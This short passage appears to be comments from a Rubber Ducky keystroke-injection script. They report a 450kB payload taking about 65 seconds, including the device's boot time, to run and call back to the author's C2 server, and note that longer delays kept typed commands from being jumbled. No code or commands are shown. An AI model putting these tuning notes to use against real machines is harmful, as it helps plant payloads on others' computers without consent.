\\My payload was about 450kB in size, and it took around 1 min and 5 seconds for the complete execution of this script and get a callback on my c2 server.
\\This time includes the OS boot time of the Rubber Ducky as well (which is about 20-25 seconds).
\\What I noticed with lesser delays was that commands were being jumbled up, hence I ended up using more and longer delays.
